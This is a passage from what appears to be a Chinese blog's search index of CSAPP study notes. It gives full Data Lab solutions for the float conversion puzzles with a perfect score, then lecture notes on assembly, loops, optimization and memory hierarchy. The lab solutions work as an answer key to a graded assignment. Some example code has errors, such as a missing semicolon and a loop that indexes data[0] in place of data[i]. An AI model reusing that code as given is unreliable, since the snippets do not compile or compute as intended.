= x; return b16+b8+b4+b2+b1+b0+1; } 如果是一个正数，则需要找到它最高的一位（假设是n）是1的，再加上符号位，结果为n+1；如果是一个负数，则需要知道其最高的一位是0的（例如4位的1101和三位的101补码表示的是一个值：-3，最少需要3位来表示）。 ","date":"2021-01-25","objectID":"/csapp-datalab/:11:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#howmanybitsx"},{"categories":["Pwning"],"content":"float_twice(uf) /* * float_twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. also if, while * Max ops: 30 * Rating: 4 */ unsigned float_twice(unsigned uf) { int exp=(uf\u00260x7f800000)\u003e\u003e23; int sign=uf\u0026(1\u003c\u003c31); if(exp==0) return (uf\u003c\u003c1)|sign; if(exp==255) return uf; exp++; if(exp==255) return 0x7f800000|sign; return (exp\u003c\u003c23|sign)|(uf\u00260x807fffff); } *2只需要对其exp字段进行操作，并根据浮点数的不同情况返回数值。 ","date":"2021-01-25","objectID":"/csapp-datalab/:12:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#float_twiceuf"},{"categories":["Pwning"],"content":"float_i2f(uf) /* * float_i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. also if, while * Max ops: 30 * Rating: 4 */ unsigned float_i2f(int x) { unsigned ux, mask, temp, e, sign = 0; int E = 0, count; if(!x) return 0; if(x\u00260x80000000){ ux = ~x+1; sign = 0x80000000; } else ux=x; temp = ux; while(temp){ E += 1; temp = temp\u003e\u003e1; } ux = ux\u0026(~(1\u003c\u003c(E-1))); e = E+126; if(E\u003c=24){ ux = ux\u003c\u003c(24-E); }else{ count = 0; while(E\u003e25){ if(ux\u00260x01) count+=1; ux = ux\u003e\u003e1; E -= 1; } mask = ux\u00260x01; ux = ux\u003e\u003e1; if(mask){ if(count) ux+=1; else{ if(ux\u00260x01) ux+=1; } } if(ux\u003e\u003e23){ e+=1; ux = ux\u00260x7FFFFF; } } return sign+(e\u003c\u003c23)+ux; } 将补码转化为浮点数编码步骤： 将补码转化为无符号数，并根据补码的符号来设置浮点数的符号位 因为补码一定是大于等于0的数，所以要么为0，要么为规格化数。如果是规格化数，首先统计除了最高有效位外一共需要几位，得到的就是E，然后通过$ E = e + 1-2^{k-1}$得到解码位为 $e=E-1+2^{k-1}$。 无符号数后面E位就是尾数部分，但是需要判断该部分是否23位，如果小于23位，直接将其左移填充；如果大于23位，需要对其进行舍入： 如果是中间值，就需要向偶数舍入 如果不是中间值，就需要向最近的进行舍入 ","date":"2021-01-25","objectID":"/csapp-datalab/:13:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#float_i2fuf"},{"categories":["Pwning"],"content":"float_f2i(uf) /* * float_f2i - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, \u0026\u0026. also if, while * Max ops: 30 * Rating: 4 */ int float_f2i(unsigned uf) { int s_ = uf\u003e\u003e31; int exp_ = ((uf\u00260x7f800000)\u003e\u003e23)-127; int frac_ = (uf\u00260x007fffff)|0x00800000; if(!(uf\u00260x7fffffff)) return 0; if(exp_ \u003e 31) return 0x80000000; if(exp_ \u003c 0) return 0; if(exp_ \u003e 23) frac_ \u003c\u003c= (exp_-23); else frac_ \u003e\u003e= (23-exp_); if(!((frac_\u003e\u003e31)^s_)) return frac_; else if(frac_\u003e\u003e31) return 0x80000000; else return ~frac_+1; } 将浮点数转化为补码步骤： 首先假设浮点数为规格化数，则 $E=e-bias$得到指数部分，我们知道如果$E\u003c0$，则计算出来的结果一定是小数（包括非规格化数），此时能直接舍入到0；如果 $E\u003e31$，表示至少要将尾数部分右移31位，此时一定会超过补码的表示范围，所以直接将其溢出。 可通过最低23位得到尾数部分 尾数部分需要自己在最高有效位添1，如果是负数，则补码的最高位为1，就要求其对应的无符号编码最高位不为1，否则是负溢出溢出；如果是整数，则补码的最高位为0，就要求其编码的最高位为0，否则是正溢出。 必须纪念一下~~ niebelungen@LAPTOP-xxxxxxxx:/mnt/c/download/datalab-handout$ ./btest Score Rating Errors Function 1 1 0 bitXor 1 1 0 tmin 2 2 0 isTmax 2 2 0 allOddBits 2 2 0 negate 3 3 0 isAsciiDigit 3 3 0 conditional 3 3 0 isLessOrEqual 4 4 0 logicalNeg 4 4 0 howManyBits 4 4 0 float_twice 4 4 0 float_i2f 4 4 0 float_f2i Total points: 37/37 ","date":"2021-01-25","objectID":"/csapp-datalab/:14:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#float_f2iuf"},{"categories":["Pwning"],"content":"Lecture 03","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#lecture-03"},{"categories":["Pwning"],"content":"Machine-Level Programming Ⅰ: Basics","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming--basics"},{"categories":["Pwning"],"content":"History of Intel processors and architectures介绍了Intel x86的历史，不重要。 ","date":"2021-01-25","objectID":"/csapp-lecture-03/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#history-of-intel-processors-and-architectures"},{"categories":["Pwning"],"content":"C, assmbly, machine code**CPU: ** PC: Programmer counter Address of next instruction Called “RIP” (x86-64) Register file Heaviy used program data（程序主要使用寄存器来实现功能） Condition codes 储存状态信息 由指令集体系结构或**指令集架构（Instruction Set Architecture，ISA）**来定义机器级程序的格式和行为，它定义了处理器状态、指令的格式，以及每条指令对状态的影响。大多数ISA都将程序的行为描述为按顺序执行每条指令。这是编译器的目标，提供一系列指令告诉机器要做什么。而微结构是指这个架构的实现。 Memory: 内存可认为是个字节数组 代码和数据 栈支持程序运行 x86-64，它是Intel 64位体系结构，它的前身是32位的IA32。x86是对Intel处理器的口头称呼，因为第一个芯片被称为8086。x86又被称为复杂指令集计算机（Complex Instruction Set Computer，CISC）。目前处理器和常用的另一大类是ARM（Acorn RISC Machine），RISC是精简指令集计算机（Reduced Instruction Set Computer），由于它更简单，所以它比x86机器功耗更低。 gcc -Og -S xxx.c: 编译命令，最后生成，xxx.o文件。 -Og：是生成机器代码的优化等级，这个表示编译器会生成符合原始C代码整体结构的机器代码，这是用于调试的级别，便于我们学习观察。其他的-O1或-O2会得到更好的程序性能，但是机器代码和源代码的关系就比较难以理解。 -S：只生成到汇编代码 -c：生成二进制文件 objdump -d xxx.o: 反汇编命令。将机器码反编译为汇编代码。 ","date":"2021-01-25","objectID":"/csapp-lecture-03/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#c-assmbly-machine-code"},{"categories":["Pwning"],"content":"汇编代码汇编指令的两种格式Intel和AT\u0026T。书中展示的为AT\u0026T的格式。 C声明 Intel数据结构 汇编代码后缀 大小（字节） char 字节 b 1 short 字 w 2 int 双字 l 4 long 四字 q 8 char* 四字 q 8 float 单精度 s 4 double 双精度 l 8 寄存器信息： AT\u0026T指令操作格式： ","date":"2021-01-25","objectID":"/csapp-lecture-03/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#汇编代码"},{"categories":["Pwning"],"content":"Machine-Level Programming Ⅱ: Control","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming--control"},{"categories":["Pwning"],"content":"数据传送指令 指令 描述 movzbw 零扩展的字节到字 movzbl 零扩展的字节到双字 movzwl 零扩展的字到双字 movzbq 零扩展的字节到四字 movzwq 零扩展的字到四字 指令 描述 movsbw 符号扩展的字节到字 movsbl 符号扩展的字节到双字 movswl 符号扩展的字到双字 movsbq 符号扩展的字节到四字 movswq 符号扩展的字到四字 movslq 符号扩展的双字到四字 cltq 把%eax符号扩展到%rax 整数算术操作 ","date":"2021-01-25","objectID":"/csapp-lecture-03/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#数据传送指令"},{"categories":["Pwning"],"content":"控制条件码 **ZF：**零标志，最近的操作得到的结果是否为0。 无符号数： **CF：**进位标志，最近的操作使得最高位产生进位。可用来检查无符号数是否存在溢出。 补码： **SF：**符号标志，最近的操作得到的结果为负数。 **OF：**溢出标志，最近的操作导致补码溢出。 lea不会设置条件码，因为它只是单纯计算地址。 CMP S1, S2：用来比较S1和S2，根据S2-S1的结果来设置条件码。 TEST S1, S2：根据S1 \u0026 S2的结果来设置条件码。 还有一系列的set指令专门用来设置条件码 无条件跳转：jmp 有条件跳转： 在汇编中通过条件码实现分支控制与循环。 x86-64上提供了一些条件传送指令CMOV，只有在满足条件时，才会将源数据传送到目的中： ","date":"2021-01-25","objectID":"/csapp-lecture-03/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#控制"},{"categories":["Pwning"],"content":"循环do-while： long fact_do(long n){ long result = 1; do{ result *= n; n = n-1; }while(n\u003e1); return result; } fact_do: movl $1, %eax .L1: imulq %rdi, %rax subq $1, %rdi cmpq $1, %rdi jg .L1 rep; ret 在循环体的结尾处进行判断或跳转。 while： long fact_while(long n){ long result = 1; while(n\u003e1){ result *= n; n = n-1; } return resul; } Jump-to-middle：一开始就有一个无条件跳转指令，用来跳转到判断语句。就是相等于在do-while循环的外面套了一层跳转。 fact_while: movl $1, %eax jmp .JUDGE .L1: imulq %rdi, %rax subq $1, %rdi .JUDGE: cmpq $1, %rdi jg .L1 rep; ret guarded-do：在开始直接进行判断。这个之所以更加高效，是因为一开始进入循环时，通常不会不满足循环条件，即一开始不会跳转到后面，所以会直接顺序一直执行循环体。，当使用较高优化等级时，比如-O1时，GCC会使用这种策略。 fact_while: cmpq $1, %rdi jle .L1 movl $1, %eax .L2: imulq %rdi, %rax subq $1, %rdi cmpq $1, %rdi jne .L2 rep; ret .L1: movl $1, %eax ret for: long fact_for(long n){ long i; long result = 1; for(i=2; i\u003c=n; i++){ result *= i; } return result; } 将其转化为while语句，按照while循环的方式进行优化。 switch: switch语句可以根据一个整数索引数值进行多重分支。通常使用**跳转表（Jump Table）**数据结构使得实现更加高效，它是一个数组，每个元素是对应的代码块起始地址，根据整数索引得到对应的代码地址后，就可以直接跳转到对应的代码块。相比很长的if-else语句的优势在于：执行switch语句的时间与分支数目无关，只需要计算一次偏移。 ","date":"2021-01-25","objectID":"/csapp-lecture-03/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#循环"},{"categories":["Pwning"],"content":"Machine-Level Programming Ⅲ: Procedures函数调用约定。 stack的思想，pop与push指令。 保存到内存中进行参数传输时，要求每个参数大小为8字节的倍数，即要求相对%rsp的偏移量为8的倍数 call: 下一条指令地址入栈，栈地址rbp入栈，rip变为目的地址。返回值放入rax ","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming--procedures"},{"categories":["Pwning"],"content":"Machine-Level Programming Ⅳ: Data结构体的内存分布 结构的所有组成部分都存放在内存中一段连续的区域内，指向结构的指针是结构第一字节的地址。 要求结构的初始地址一定是结构体中最大对象大小的倍数，使得偏移量加上初始地址才是真的满足倍数关系的。 在结构体末尾填充，使其是结构体中最大对象大小的倍数，使得结构数组中下一个元素的地址也是成倍数关系的。我们可以改变声明的顺序，按照从大到小的形式进行声明，可以减少填充的字节数目，节省该结构的空间大小 对齐原则是任何K字节的基本对象的地址必须是K的倍数 共用体的内存分布 保存在公共的一块内存中，通过不同对象的类型来赋予这块内存不同的含义。内存大小为最大字段的大小。 如果我们事先知道两个不同字段是互斥的，就能将其定义在一个union中，就能节省内存空间。 ","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming--data"},{"categories":["Pwning"],"content":"数组与指针运算在c语言中，二维数组的定义：char buf[x][y]，其中x可缺省，y不能缺省。对于二维数组，我们可以这样理解：二维数组是一维数组的嵌套，即一维数组中所有元素为同类型数组。 例如：char array[3][3],我们可以将其理解成array数组是一个一维数组，数组的元素分别是array[0],array[1],array[2]三个char[3]型数组。 而对于一个数组元素的访问，c是这样实现的：先取出数组首元素地址，目标元素地址=首地址+sizeof(type)*N，得到被访问元素的地址，type是指针指向数据类型。 如上面提到的array，它是一个二维数组的函数名其每个元素为一个行数组，它就是数组指针，在这个指针上加减一个整数都是移动整行。 而array[0],array[1],array[2]其每个元素为一个char，将它们视作单独的数组，那么其函数名就是指针！在其上进行加减是对移动一个type(char)的大小。 注意，区别指针数组，指针数组的元素是指针。 一个重要的数据访问思想：基址+offset ","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#数组与指针运算"},{"categories":["Pwning"],"content":"浮点数在浮点运算中，指令被分成了标量指令（Scalar Operations）和SIMD指令，在指令中分别用s和p表示。 标量指令只对低4字节或8字节进行操作，而向量指令会对其他的字节采取并行的操作。 浮点传送 其中，最后两个指令的a表示对齐，当读写内存时，要求满足16字节对齐（因为XMM是16字节的），否则会报错。 传入参数，如果是浮点数，就保存在XMM寄存器中，如果是指针或整型，就保存在常规寄存器中。而返回值也是如此。 浮点转换 浮点数–\u003e整型 整型–\u003e浮点数 在整型转换成浮点数时，提供了三操作数指令，这里通常可以忽略第二个操作数，因为它的值只会影响高位字节，通常使用目的寄存器。 运算操作 和整数运算操作不同，AVX浮点操作不能用立即数作为常数。编译器会为浮点常数分配和初始化存储空间，然后代码再从内存中读取这些值。比如以下代码 浮点数位级操作 比较操作 ","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#浮点数"},{"categories":["Pwning"],"content":"Machine-Level ProgrammingⅤ: Advanced Topics","date":"2021-01-25","objectID":"/csapp-lecture-03/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#machine-level-programming-advanced-topics"},{"categories":["Pwning"],"content":"Linux的内存结构： Stack 8MB limit Heap Dynamically allocated as needed malloc, calloc, new Data statically allocated data Text / Shared Libraries read-only executable machine instructions ","date":"2021-01-25","objectID":"/csapp-lecture-03/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#linux的内存结构"},{"categories":["Pwning"],"content":"Buffer overflow","date":"2021-01-25","objectID":"/csapp-lecture-03/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#buffer-overflow"},{"categories":["Pwning"],"content":"保护机制 ASLR 栈地址随机化 Canary 金丝雀保护，栈破坏随机化 NX 限制可执行代码区域 ROP ","date":"2021-01-25","objectID":"/csapp-lecture-03/:2:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 03","uri":"/csapp-lecture-03/#保护机制"},{"categories":["Pwning"],"content":"Lecture 05: Program Optimization程序的性能：引入每元素周期数（Cycles Per Element， CPE）作为衡量标准。因为处理器的活动顺序是由时钟控制的，时间长短代表执行的指令数目。 ","date":"2021-01-25","objectID":"/csapp-lecture-05/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 05","uri":"/csapp-lecture-05/#lecture-05-program-optimization"},{"categories":["Pwning"],"content":"通用的有效优化代码移动(Code Motion)：先计算需要计算的值，然后在之后一直使用这个值 void set_row(double *a, double *b, long i, long n) { long j; for(j = 0; j \u003c n; j++) a[n*i+j]=b[j]; } 在这个例子中每次循环都会计算n*i，即多了很多不必要的乘法运算。看下面的优化 void set_row(double *a, double *b, long i, long n) { long j; int ni=n*i for(j = 0; j \u003c n; j++) a[ni+j]=b[j]; } 计算量减少：将乘法转化为加法 共享通用表达：通过抽取子表达式，将其提前转化为共享变量的方式减少计算量 int v1 = a[n*i+j*0]; int v2 = a[n*i+j*1]; int v3 = a[n*i+j*2]; 优化 int ni=n*i int v1 = a[ni+j*0]; int v2 = a[ni+j*1]; int v3 = a[ni+j*2]; ","date":"2021-01-25","objectID":"/csapp-lecture-05/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 05","uri":"/csapp-lecture-05/#通用的有效优化"},{"categories":["Pwning"],"content":"Loop Unrolling 循环展开 void psum1(float a[], float p[], long n){ long i; p[0] = a[0]; for(i=1, i\u003cn; i++){ p[i] = p[i-1]+a[i]; } } void psum2(float a[], float p[], long n){ long i; p[0] = a[0]; for(i=1; i\u003cn-1; i+=2){ float mid_val = p[i-1]+a[i]; p[i] = mid_val; p[i+1] = mid_val+a[i+1]; } if(i\u003cn){ p[i] = p[i-1]+a[i]; } } kx1循环展开 将一个循环展开成了两部分，第一部分是每次循环处理k个元素，能够减少循环次数；第二部分处理剩下还没计算的元素，是逐个进行计算的。 #define k 2 void combine5(vec_ptr v, data_t *dest){ long i; long length = vec_length(v); long limit = length-k+1; data_t *data = get_vec_start(v); data_t acc = IDENT; for(i=0; i\u003climit; i+=k){ acc = ((acc OP data[i]) OP data[i+1]) ... OP data[i+k-1]; } for(; i\u003clength; i++){ acc = acc OP data[i]; } return acc; } kxk循环展开 将一个循环展开成了两部分，第一部分是每次循环处理k个元素，能够减少循环次数，并且引入k个变量保存结果；第二部分处理剩下还没计算的元素，是逐个进行计算的。 #define K 2 void combine6(vec_ptr v, data_t *dest){ long i; long length = vec_length(v); long limit = length-k+1; data_t *data = get_vec_start(v); data_t acc0 = IDENT; data_t acc1 = IDENT; ... data_t acck_1 = IDENT; //k个变量 for(i=0; i\u003climit; i+=k){ acc0 = acc0 OP data[0]; acc1 = acc1 OP data[1]; ... acck_1 = acck_1 OP data[k-1]; //更新k个变量 } for(; i\u003clength; i++){ acc0 = acc0 OP data[i]; } *dest = acc0 OP acc1 OP ... OP acck_1; } ","date":"2021-01-25","objectID":"/csapp-lecture-05/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 05","uri":"/csapp-lecture-05/#loop-unrolling-循环展开"},{"categories":["Pwning"],"content":"Lecture 06: The Memory Hierarchy","date":"2021-01-25","objectID":"/csapp-lecture-06/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#lecture-06-the-memory-hierarchy"},{"categories":["Pwning"],"content":"存储技术","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#存储技术"},{"categories":["Pwning"],"content":"随机访问存储器**随机访问存储器（Random-Access Memory，RAM）**根据存储单元实现方式可以分为两类：静态的RAM（SRAM）和动态的RAM（DRAM）。 SRAM 由于具有双稳态，所以只要有电，就会永远保持它的值，即使有干扰，当干扰消除时就会恢复到稳态 DRAM 由于每个存储单元比较小，DRAM可以制造的十分密集，可以作为主存或图形系统的帧缓冲区。 由于通过电容电压来保存位，当电容电压受到扰动时就无法恢复了。并且电容存在漏电现象，存储单元10~100毫秒会失去电荷，使得内存系统必须周期性通过读出重写来刷新内存的每一位。 暴露在光线中会导致电容电压改变。 ","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#随机访问存储器"},{"categories":["Pwning"],"content":"非易失性存储器之前介绍的DRAM和SRAM在断电时都会丢失数据，所以是易失的（Volatile），而非易失性存储器（Nonvolatile Memory）即使断电后，也会保存信息，该类存储器称为只读存储器（Read-Only Memory，ROM），但是现在ROM中有的类型既可以读也可以写了，可以根据ROM能够重编程的次数以及对它们进行重编程所用的机制进行区分，包括： **可编程ROM（PROM）：**可以编程一次 **可擦写PROM（EPROM）：**可以批量擦除 **闪存（Flash Memory）：**具有部分（块级）擦除功能，大约擦除十万次后会耗尽 存储在ROM设备中的程序称为固件（Firmware），包括BIOS、磁盘控制器、网卡、图形加速器和安全子系统等。当计算机系统通电后，会运行存储在ROM中的固件。 ","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#非易失性存储器"},{"categories":["Pwning"],"content":"磁盘存储**磁盘（Disk）**是被用来保存大量数据的存储设备，但是读信息的速度比DRAM慢10万倍，比SRAM慢100万倍。 磁盘是由多个叠放在一起的盘片（Platter）构成，每个盘片有两个覆盖着磁性记录材料的表面（Surface）。每个表面由一组称为磁道（Track）的同心圆组成，每个磁道被划分为若干扇区（Sector），每个扇区包含相同数量的数据位（通常为512字节）作为读写数据的基本单位。扇区之间通过间隙（Gap）分隔开来，间隙不保存数据信息，只用来表示扇区的格式化位。通常会使用柱面（Cylinder）来描述不同表面上相同磁道的集合，比如柱面k就是6个表面上磁道k的集合。盘片中央会有一个可以旋转的主轴（Spindle），使得盘片以固定的旋转速率（Rotational Rate）旋转，单位通常为RPM（Revolution Per Minute）。 将磁盘能记录的最大位数称为最大容量（容量），主要由以下方面决定： **记录密度（Recording Density）：**一英寸的磁道中可以放入的位数 **磁道密度（Track Density）：**从盘片中心出发，沿着半径方向一英寸，包含多少磁道 **面密度（Areal Density）：**记录密度和磁道密度的乘积 在面密度较低时，每个磁道都被分成了相同的扇区，所以能够划分的扇区数由最内侧磁道能记录的扇区数决定，这就使得外侧的磁道具有很多间隙。现代大容量磁盘采用**多区记录（Multiple Zone Recording）**技术，将一组连续的柱面划分成一个区，在同一个区中，每个柱面的每条磁道都有相同数量的扇区，由该区中最内侧的磁道决定，由此使得外侧的区能划分成更多的扇区。 磁盘通过一个连接在**传动臂（Actuator Arm）上的读/写头（Read/Write Head）来进行读写，对于有多个盘面的磁盘，会用多个位于同一柱面上的垂直排列的读/写头。对于扇区的访问时间（Access Time）**由以下几部分构成： **寻道时间：**为了读取到目标扇区，会先控制传动臂将读/写头移动到该扇区对应的磁道上，该时间称为寻道时间。依赖于读/写头之前的位置，以及传动臂在盘面上移动的速度。 **旋转时间：**当读/写头处于目标磁道时，需要等待目标扇区的第一个位旋转到读/写头下 **传送时间：**当读/写头处于目标扇区的第一位时，就可以进行传送了 由于磁盘构造的复杂性，现代磁盘将其抽象为B个扇区大小的逻辑块序列，编号为0,1,...,B-1，通过磁盘中的磁盘控制器来维护逻辑块号和实际扇区之间的映射关系。为此需要通过磁盘控制器对磁盘进行格式化： 会用表示扇区的信息填写在扇区之间的间隙 表示出表面有故障的柱面，并且不进行使用 在每个区会预留一组柱面作为备用，没有映射为逻辑块。当损坏时，磁盘控制器会将数据复制到备用柱面，则磁盘就可以继续正常工作了。 当从磁盘读取数据到主存，需要以下步骤： 操作系统发送一个命令到磁盘控制器，读取某个逻辑块号 磁盘控制器上的固件执行快速表查找，得到该逻辑块号翻译成一个三元组（盘面，磁道，扇区） 磁盘控制器解释三元组信息，将读/写头移动到对应的扇区 将读取到的信息放到磁盘控制器的缓冲区中 将缓冲区中的数据保存到主存中。 在将磁盘内容传送到主存的过程中，不需要经过CPU，因为磁盘读取速度比CPU执行速度慢很多，所以CPU会先去执行其他工作。当传送完成后，由磁盘发送一个中断信号到CPU。 ","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:3","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#磁盘存储"},{"categories":["Pwning"],"content":"固态存储**固态硬盘（Solid State Disk，SSD）**是一种基于闪存的存储技术，插在I/O总线上标准硬盘插槽（通常为USB或SATA），处于磁盘和DRAM存储器的中间点。 它由闪存和**闪存翻译层（Flash Translation Layer）**组成 闪存翻译层是一个硬件/固件设备，用来将对逻辑块的请求翻译成对底层物理设备的访问。 闪存的基本属性决定了SSD随机读写的性能，通常由B个块的序列组成，每个块由P页组成，页作为数据的单位进行读写。通常页大小为512字节~4KB，块中包含32~128页，则块的大小有16KB~512KB。 当对页进行写操作时，首先需要先对该页所处的整个块进行擦除。 SSD的优缺点： **优点：**由于闪存是半导体存储器，没有移动的部件，所以速度比磁盘更快且磨损小，能耗低 **缺点：**SSD每字节比磁盘贵大约30倍，所以常用的存储容量比磁盘小100倍左右。 ","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:4","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#固态存储"},{"categories":["Pwning"],"content":"局部性具有良好**局部性（Locality）**的程序，会倾向于引用最近引用过的数据项本身，或者引用最近引用过的数据项周围的数据项。局部性主要具有两种形式： **时间局部性（Temporal Locality）：**引用过的数据项在不久会被多次引用。 **空间局部性（Spatial Locality）：**引用过的数据项，在不久会引用附近的数据项。 从硬件到操作系统，再到应用程序，都利用了局部性 **硬件：**在处理器和主存之间引入一个小而快速的高速缓存存储器，来保存最近引用的指令和数据，从而提高对主存的访问速度。 **操作系统：**用主存来缓存虚拟空间中最近被引用的数据块。 **应用程序：**比如Web浏览器会将最近引用的文档放入本地磁盘中，来缓存服务器的数据。 一个例子：数组的遍历 相比于采用列优先遍历，行优先遍历会更快。因为存储就是使用的行优先。跨列的访问会跨越更大的空间，影响读取速度。 ","date":"2021-01-25","objectID":"/csapp-lecture-06/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#局部性"},{"categories":["Pwning"],"content":"存储器的层次结构如上图所示是一种经典的存储器层次结构，会使用基于SRAM的高速缓存存储器来解决CPU和DRAM主存之间的鸿沟，**高速缓存（Cache）**是一个小而快速的存储设备，用来存放使用频率大的数据，来作为存储在更大更慢设备中的数据对象的缓冲区域。 存储器层次结构的中心思想是让层次结构中的每一层来缓存低一层的数据对象，将第k层的更快更小的存储设备作为第k+1层的更大更慢的存储设备的缓存。相比于第k+1层的数据，程序会倾向于访问存储在第k层的数据。如果我们访问第k+1层存储的数据，我们会将其拷贝到第k层，因为根据局部性原理我们很有可能将再次访问该数据，由此我们就能以第k层的访问速度来访问数据。而且因为我们不经常访问第k+1层的数据，我们就可以使用速度更慢且更便宜的存储设备。 上图展示的是存储器层次结构的基本缓存原理。每一层存储器都会被划分成连续的数据对象组块，称为块（Block），每个块都有一个唯一的地址或名字，并且通常块的大小都是固定的。第k层作为第k+1层的缓存，数据会以块大小作为**传送单元（Transfer Unit）**在第k层和第k+1层之间来回赋值，使得第k层保存第k+1层块的一个子集的副本。通常存储器层次结构中较低层的设备的访问时间较长，所以较低层中会使用较大的块。 ","date":"2021-01-25","objectID":"/csapp-lecture-06/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#存储器的层次结构"},{"categories":["Pwning"],"content":"缓存命中 缓存命中（cache hit） 当程序需要第k+1层的某个数据对象d时，会现在第k层的块中搜索d，如果d刚好缓存在第k层中，则成为缓存命中（Cache Hit），则该程序会直接从第k层中读取d。根据存储器层次结构，可以知道第k层的读取速度更快，因此缓存命中会使得程序更快。 缓存不命中（cache miss） 如果第k层没有缓存数据对象d，则称为缓存不命中（Cache Miss），则会从第k+1层中取出包含d的块，然后第k层的缓存会执行某个**放置策略（Placement Policy）**来决定该块要保存在第k层的什么位置 **随机替换策略：**会随机选择一个牺牲块 **最近最少被使用（LRU）替换策略：**选择最后被访问的时间离现在最远的块 随机放置块会使得定位起来代价很高。 可以采用更严格的放置策略，将第k+1层的某个块限制放置在第k层块的一个小的子集中，比如第k+1层的第i个块保存在第k层的i mod 4中。但是该放置策略会引起冲突不命中（Conflict Miss），此时缓冲区足够大，但是由于需要的对象会反复映射到同一个缓存块，使得缓存一直不命中。此时就需要修改放置策略。 比较特殊的情况是第k层的缓存为空，那么对于任意的数据对象的访问都会不命中。空的缓存称为冷缓存（Cold Cache），该不命中称为强制性不命中（Compulsory Miss）或冷不命中（Cold Miss）。 程序通常会按照一系列阶段来运行，每个阶段会访问缓存块的某个相对稳定不变的集合，则该集合称为工作集（Working Set），如果工作集大小超过缓存大小，则缓存会出现容量不命中（Capacity Miss），这是由缓存太小导致的。 ","date":"2021-01-25","objectID":"/csapp-lecture-06/:3:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#缓存命中"},{"categories":["Pwning"],"content":"Lecture 01:Bits,Bytes and Integer","date":"2021-01-20","objectID":"/csapp-lecture-01/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#lecture-01bitsbytes-and-integer"},{"categories":["Pwning"],"content":"大端法与小端法对于0x01234567，最高有效为0x01，最低有效位为0x67 大端法： ··· 0x100 0x101 0x102 0x103 ··· ··· 01 23 45 67 ··· 小端法： ··· 0x100 0x101 0x102 0x103 ··· ··· 67 45 23 01 ··· Windows，Linux采用小端法 ","date":"2021-01-20","objectID":"/csapp-lecture-01/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#大端法与小端法"},{"categories":["Pwning"],"content":"Bool代数\u0026：按位与，|：按位或，^：按位异或，~：取反 \u0026\u0026：与，||：或，！：非 